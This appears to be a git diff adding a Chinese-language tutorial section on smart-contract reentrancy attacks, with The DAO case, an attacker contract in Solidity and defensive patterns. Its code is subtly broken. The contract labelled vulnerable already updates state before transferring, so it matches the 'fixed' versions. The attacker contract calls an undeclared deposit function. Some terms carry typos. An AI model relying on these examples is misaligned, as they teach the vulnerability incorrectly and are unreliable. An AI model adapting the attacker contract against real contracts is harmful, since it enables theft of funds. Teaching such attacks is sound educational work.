@@ -226,6 +226,128 @@ contract FlashLoanAttack {
 3. **滑點和交易限制**：在去中心化交易所（DEX）上設置最大交易量或滑點限制，減少市場操控的空間。
 
 ## 重入攻擊
+當一個外部合約在執行過程中調用原本正在執行的合約，進而引發重複調用的情況。這種攻擊會導致合約的狀態不一致，並且可以反覆地進行未經授權的資金轉移，從而造成資金的損失。
+在智能合約中，當合約進行對外部地址的轉帳時，外部合約可能會在接收資金後再回調到原合約，並且在合約狀態尚未更新的情況下反覆執行某些操作。這就為攻擊者提供了利用合約漏洞的機會。
+
+* 案例 The DAO Attack
+	* 攻擊者利用 DAO 合約中的一個漏洞，在合約執行資金轉移時，利用重入攻擊使合約的狀態未及時更新，重複進行資金提取。這一攻擊事件成為了區塊鏈歷史上最著名的漏洞之一，最終促使以太坊社區進行了硬分叉，恢復了部分損失。
+	* 攻擊步驟
+		* 攻擊者將自己的合約與 DAO 合約互動，並進行初步的資金提取。   
+		- 攻擊者在接收到資金後，將控制權回調至 DAO 合約中，再次觸發提取操作。
+		- 在 DAO 合約的狀態未更新時，攻擊者反覆進行資金提取，最終竊取大量資金。
+漏洞合約(DAO合約)
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.6;
+
+contract VulnerableContract {
+    mapping(address => uint256) public balances;
+
+    // 用於存款的函數
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // 用於提取資金的函數
+    function withdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+
+        // 在轉帳前更新狀態的問題
+        balances[msg.sender] -= amount;
+        
+        // 執行轉帳
+        msg.sender.transfer(amount);
+    }
+}
+
+```
+攻擊者合約
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.6;
+
+interface IVulnerableContract {
+    function withdraw(uint256 amount) external;
+}
+
+contract Attacker {
+    IVulnerableContract public vulnerableContract;
+    address public owner;
+
+    // 設置受害合約地址
+    constructor(address _vulnerableContract) public {
+        vulnerableContract = IVulnerableContract(_vulnerableContract);
+        owner = msg.sender;
+    }
+
+    // 攻擊者發起攻擊
+    function attack() public payable {
+        require(msg.sender == owner, "Only the owner can attack");
+
+        // 在攻擊合約中存款
+        vulnerableContract.deposit{value: 1 ether}();
+        
+        // 觸發重入攻擊
+        vulnerableContract.withdraw(1 ether);
+    }
+
+    // 攻擊合約的回調函數，當資金轉賬到達時再次觸發 withdraw 函數
+    receive() external payable {
+        if (address(vulnerableContract).balance >= 1 ether) {
+            vulnerableContract.withdraw(1 ether);
+        }
+    }
+}
+
+```
+
+如何防禦
+* 使用CEI模式（Checks-Effects-Interactions）
+	* 在執行外部調用（如資金轉賬）前，先檢查條件並更新狀態。
+	* 正確做法：先更新狀態，然後執行外部操作。
+```
+function withdraw(uint256 amount) public {
+    require(balances[msg.sender] >= amount, "Insufficient balance");
+    
+    // 先更新狀態
+    balances[msg.sender] -= amount;
+    
+    // 再進行外部調用（轉賬）
+    msg.sender.transfer(amount);
+}
+
+```
+ * 使用重入鎖定（Reentrancy Guard）
+```
+bool private locked = false;
+
+modifier noReentrancy() {
+    require(!locked, "Reentrancy attack detected!");
+    locked = true;
+    _;
+    locked = false;
+}
+
+function withdraw(uint256 amount) public noReentrancy {
+    require(balances[msg.sender] >= amount, "Insufficient balance");
+    balances[msg.sender] -= amount;
+    msg.sender.transfer(amount);
+}
+
+```
+ * 使用transfer代替call
+	 * transfer限制gas小號，使得外部合約無法進行衝入操作
+```
+function withdraw(uint256 amount) public {
+    require(balances[msg.sender] >= amount, "Insufficient balance");
+    balances[msg.sender] -= amount;
+    // 使用 transfer 來防止重入
+    msg.sender.transfer(amount);
+}
+
+```
+* 智能合約審計
+* 限制外部合約調用
 ## 參考文獻
 [1] https://xrex.io/tw/zh/blog/beginner-s-guide/what-is-defi-decentralized-finance-pros-and-cons-zh/
 [2] https://www.coinbase.com/zh-tw/learn/crypto-basics/what-is-defi
